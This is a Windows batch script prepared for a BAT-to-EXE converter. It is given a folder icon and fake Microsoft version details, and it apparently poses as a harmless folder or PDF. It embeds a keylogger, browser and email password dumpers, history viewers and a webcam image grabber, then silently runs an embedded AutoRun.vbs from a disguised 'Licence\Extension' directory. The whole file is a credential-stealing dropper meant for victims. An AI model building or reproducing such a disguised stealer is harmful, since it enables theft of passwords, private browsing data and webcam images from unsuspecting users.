@ECHO OFF
REM BFCPEOPTIONSTART
REM Advanced BAT to EXE Converter www.BatToExeConverter.com
REM BFCPEEXE=C:\Users\Shakil-PC\Desktop\pdf\folder.exe
REM BFCPEICON=C:\Program Files (x86)\Advanced BAT to EXE Converter PRO v2.91\ab2econv291pro\icons\folder-7.ico
REM BFCPEICONINDEX=1
REM BFCPEEMBEDDISPLAY=0
REM BFCPEEMBEDDELETE=0
REM BFCPEADMINEXE=0
REM BFCPEINVISEXE=0
REM BFCPEVERINCLUDE=1
REM BFCPEVERVERSION=7.0.1.1
REM BFCPEVERPRODUCT=Windows Files
REM BFCPEVERDESC=Windows Files
REM BFCPEVERCOMPANY=Microsoft
REM BFCPEVERCOPYRIGHT=Copyright Info - @ Microsoft
REM BFCPEEMBED=C:\Users\Shakil-PC\Desktop\pdf\AutoRun.vbs
REM BFCPEEMBED=C:\Users\Shakil-PC\Desktop\pdf\facebook.exe
REM BFCPEEMBED=C:\Users\Shakil-PC\Desktop\pdf\instagram.exe
REM BFCPEEMBED=C:\Users\Shakil-PC\Desktop\pdf\Pendrive.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\a310logger.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\BrowserAddonsView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\BrowserDownloadsview.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\BrowsingHistoryView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\ChromeHistoryView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\ChromePass.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\FirefoxDownloadsView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\iehv.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\IEpassView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\mailpv.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\MyLastSearch.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\nircmd.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\OperaPassView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\PasswordFox.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\SafariHistoryView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\SkypeLogView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\TaskSchedulerView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\UninstallView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\WebBrowserPassView.exe
REM BFCPEEMBED=C:\Users\Public\Licence\Extension\WebCamImageSave.exe
REM BFCPEOPTIONEND
@ECHO ON
@echo off
:%SystemRoot%\explorer.exe "%cd%"
::timeout 2 > NUL

::'start "%MYFILES%\Higher Math 1st and 2nd.pdf"

:: this is only embeded files master bat




pushd %~dp0
cd /D C:\Users\Public\Licence\Extension


cscript %MYFILES%\AutoRun.vbs


exit
